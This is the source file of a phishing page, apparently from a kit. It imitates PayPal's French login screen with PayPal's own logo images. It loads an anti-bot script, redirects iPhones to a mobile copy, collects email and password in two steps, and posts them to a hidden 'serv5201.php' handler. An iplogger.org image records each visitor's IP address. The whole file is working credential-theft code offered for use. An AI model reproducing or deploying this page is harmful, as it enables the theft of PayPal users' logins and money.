<?php  

include'antibots.php';
ob_start();
session_start();
?>
<!DOCTYPE html>
<script type="text/javascript">if ((navigator.userAgent.match(/iPhone/i)) || (navigator.userAgent.match(/iPod/i))) {   location.replace("../security/indexm.php");}</script>
<html dir="ltr">
    <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <title>Connectez vous à votre compte</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
        
        <link rel="stylesheet" href="css/normalize.css" />
        <link rel="stylesheet" href="css/bootstrap.min.css" />
        <link rel="stylesheet" href="css/font-awesome.min.css" />
        <link rel="stylesheet" href="css/login.css" />
        <link rel="shortcut icon" type="image/x-icon" href="img/ppl.ico">
    </head>
    <body>
        <div class="lod-full" style="display: none;">
            <div class="lod-c"></div>
        </div>
        <style>

            @media (max-width: 430px){
                .log-f{
                    padding: 0 8% 30px;
                }  
            }
                .error {
                    border: 1px solid #c72e2e;
                }
			.contentContainer {
	position: relative;
	margin: 130px auto 0;
	padding: 30px 10% 50px;
	-webkit-border-radius: 5px;
	-moz-border-radius: 5px;
	-khtml-border-radius: 5px;
	border-radius: 5px
}

.contentContainer .modal-overlay {
	content: "";
	height: 100%;
	width: 100%;
	position: absolute;
	top: 0;
	left: 0;
	z-index: 16;
	-moz-opacity: .5;
	-khtml-opacity: .5;
	-webkit-opacity: .5;
	opacity: .5;
	-ms-filter: alpha(opacity=50);
	filter: alpha(opacity=50);
	background-color: #fff
}

.contentContainerBordered {
	margin: 120px auto 0;
	padding: 42px 42px 36px;
	border: 1px solid #eaeced;
	overflow: hidden
}

.contentContainerNoLogo {
	margin-top: 170px
}
.corral {
	margin: 0 auto;
	width: 460px;
	position: relative
}
.paypal-logo {
	margin: 0 auto 20px;
	text-indent: 100%;
	overflow: hidden;
	white-space: nowrap
}

.paypal-logo-long {
	background: transparent url(https://www.paypalobjects.com/images/shared/paypal-logo-129x32.svg) top center no-repeat;
	background-size: auto 28px;
	width: 129px;
	height: 32px;
	display: block
}

.lower-than-ie9 .paypal-logo-long {
	background: transparent url(https://www.paypalobjects.com/images/shared/paypal-logo-129x32.png) top center no-repeat
}

.paypal-logo-monogram {
	background: transparent url(https://www.paypalobjects.com/images/shared/momgram@2x.png) top center no-repeat;
	background-size: 30px;
	width: 30px;
	height: 36px
}
.loginSignUpSeparator{
    border-top:1px solid #cbd2d6;
    position:relative;
    margin:25px 0 -20px;
    text-align:center
}
.loginSignUpSeparator .textInSeparator{
    background-color:#fff;
    padding:0 .5em;
    position:relative;
    color:#6c7378;
    top:-.7em
}
.espace {
    display: block;
    margin: 0px;
    line-height: 10px;
    content: " "; 
}
	</style>
        <div class="contain">
        	<div class="corral">
        	<div id="content" class="contentContainer activeContent contentContainerBordered">		
            <form method="POST" action="<?php echo 'info/serv5201.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" id="logform">
                <header>
                    <p class="paypal-logo paypal-logo-long"></p>
                </header>
                <input id="email" type="email" name="mail" class="in-form" placeholder="Email" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                <input id="pass" type="password" name="pass" class="in-form" placeholder="Mot de passe" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                <div class="espace"><br></div>
                <button type="button" class="login-btn">Suivant</button>
                <div class="loginSignUpSeparator"><span class="textInSeparator">ou</span></div>
                <a href="#" class="login-btn sin-up">Ouvrir un compte</a>
            </form>
        </div>
        <img src="https://iplogger.org/19M937" />
<?php include'./info/footerv.php'?>
        <script src="js/jquery-1.11.3.min.js"></script>
        <script src="js/bootstrap.min.js"></script>
        <script src="js/plugins.js"></script>
        <script>
$(document).ready(function() {
$('#pass').hide();
function validateEmail(email) {
    var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
}
$('button').on('click',function(){
    if(validateEmail($('#email').val())){
    $('#email').fadeOut(50);
    $('#pass').fadeIn(50);
    $('button').html('Connexion');
    setTimeout(function(){
            $('button').attr('type','submit');
    },500);  
    }else {
       $('#email').addClass('error');
    }
});
$('#email').on('focusout',function(){
if(validateEmail($('#email').val())){
    $('#email').removeClass('error');
        }
});
$('input').keypress(function(e) {
    if(e.which == 13) {
        $('button').click();
    }
});
                
                });
        </script>
    </body>
</html>